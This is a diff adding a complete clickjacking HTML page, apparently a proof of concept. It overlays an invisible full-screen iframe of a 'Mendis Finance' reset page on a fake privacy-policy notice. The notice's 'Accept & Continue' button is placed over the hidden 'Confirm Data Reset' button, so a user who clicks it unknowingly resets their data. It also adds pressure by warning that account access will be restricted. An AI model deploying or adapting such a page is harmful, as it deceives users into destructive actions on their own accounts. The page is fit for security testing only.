@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mendis Finance — Action Required</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: #F3F5F8;
+  color: #10151F;
+  min-height: 100vh;
+}
+
+/* ── TRANSPARENT IFRAME — Mendis reset.html, full viewport, on top ── */
+#victim-frame {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+  opacity: 0;           /* invisible — click-through only */
+  z-index: 100;         /* above everything */
+  pointer-events: auto; /* receives all clicks */
+}
+
+/* ── FAKE UI — visible, below iframe in z-order ── */
+.header {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 18px 24px;
+  border-bottom: 1px solid #E3E7EE;
+  background: #fff;
+  position: relative;
+  z-index: 1;
+}
+.header-logo {
+  width: 32px; height: 32px;
+  border-radius: 9px;
+  background: #2F5BEA;
+  display: flex; align-items: center; justify-content: center;
+}
+.header-title { font-size: 16px; font-weight: 700; color: #10151F; }
+
+.content {
+  max-width: 420px;
+  margin: 0 auto;
+  padding: 32px 24px 160px;
+}
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: #FEF3C7;
+  border: 1px solid #FCD34D;
+  color: #92400E;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: .05em;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  border-radius: 20px;
+  margin-bottom: 16px;
+}
+h1 {
+  font-size: 22px;
+  font-weight: 800;
+  color: #10151F;
+  line-height: 1.2;
+  margin-bottom: 10px;
+}
+.subtitle {
+  font-size: 14px;
+  color: #5B6474;
+  line-height: 1.65;
+  margin-bottom: 24px;
+}
+.policy-box {
+  background: #fff;
+  border: 1px solid #E3E7EE;
+  border-radius: 14px;
+  padding: 18px;
+  margin-bottom: 20px;
+}
+.policy-box h3 {
+  font-size: 13px;
+  font-weight: 700;
+  color: #10151F;
+  margin-bottom: 8px;
+  letter-spacing: .02em;
+}
+.policy-box p {
+  font-size: 13px;
+  color: #5B6474;
+  line-height: 1.6;
+  margin-bottom: 10px;
+}
+.policy-box p:last-child { margin-bottom: 0; }
+.policy-list {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.policy-list li {
+  font-size: 13px;
+  color: #5B6474;
+  display: flex;
+  gap: 8px;
+  align-items: flex-start;
+}
+.policy-list li::before {
+  content: '•';
+  color: #2F5BEA;
+  font-weight: 700;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+.note {
+  font-size: 12px;
+  color: #9AA4B5;
+  line-height: 1.5;
+  margin-bottom: 24px;
+}
+
+/* ── FAKE ACCEPT BUTTON — same position as reset.html's confirm button ── */
+.accept-btn {
+  position: fixed;
+  bottom: 80px;
+  left: 24px;
+  right: 24px;
+  height: 54px;
+  background: #2F5BEA;
+  color: #fff;
+  border: none;
+  border-radius: 14px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 16px rgba(47,91,234,.35);
+  z-index: 2;           /* above fake UI, below iframe */
+  pointer-events: none; /* clicks pass through to iframe above */
+  cursor: pointer;
+}
+.accept-note {
+  position: fixed;
+  bottom: 48px;
+  left: 0; right: 0;
+  text-align: center;
+  font-size: 11px;
+  color: #9AA4B5;
+  z-index: 2;
+  pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Mendis reset.html loaded transparent — receives all clicks -->
+<iframe id="victim-frame" src="https://mendis.onrender.com/reset.html"></iframe>
+
+<div class="header">
+  <div class="header-logo">
+    <svg width="18" height="18" viewBox="0 0 100 100" fill="none">
+      <rect width="100" height="100" rx="23" fill="#2F5BEA"/>
+      <path d="M22 46v-4a8 8 0 0 1 8-8h40" stroke="#fff" stroke-width="6" stroke-linecap="round"/>
+      <rect x="20" y="42" width="60" height="40" rx="9" stroke="#fff" stroke-width="6"/>
+      <rect x="58" y="53" width="25" height="18" rx="6" fill="#fff"/>
+      <circle cx="66" cy="62" r="3.4" fill="#2F5BEA"/>
+    </svg>
+  </div>
+  <span class="header-title">Mendis Finance</span>
+</div>
+
+<div class="content">
+  <div class="badge">⚠ Action Required</div>
+  <h1>Updated Privacy & Data Policy</h1>
+  <p class="subtitle">
+    Mendis Finance has updated its data retention policy in compliance with updated regional
+    data protection regulations. You must acknowledge the updated terms to continue
+    using your account without interruption.
+  </p>
+
+  <div class="policy-box">
+    <h3>What's changing</h3>
+    <p>Effective December 1, 2026, Mendis Finance will apply the following updates to how
+    your financial data is processed and retained:</p>
+    <ul class="policy-list">
+      <li>Transaction data retained for 7 years for regulatory compliance (previously 5 years)</li>
+      <li>Card metadata shared with fraud-detection partners under data processing agreements</li>
+      <li>Account activity logs retained for 90 days (previously 30 days)</li>
+      <li>Users in the EU/EEA may request full data export at any time</li>
+    </ul>
+  </div>
+
+  <div class="policy-box">
+    <h3>Your choices</h3>
+    <p>By clicking <strong>Accept & Continue</strong> below, you acknowledge the updated
+    policy. Your account access and data will remain fully intact.</p>
+    <p>If you do not accept, your account access will be restricted starting December 1, 2026.</p>
+  </div>
+
+  <p class="note">
+    Questions? Contact privacy@mendisfinance.com · Policy version 3.1 · Effective Dec 1, 2026
+  </p>
+</div>
+
+<!-- Visible fake button — same fixed position as reset.html's "Confirm Data Reset" -->
+<div class="accept-btn">
+  <span>✓</span> Accept &amp; Continue
+</div>
+<div class="accept-note">By accepting you agree to the updated Mendis Privacy Policy v3.1</div>
+
+</body>
+</html>
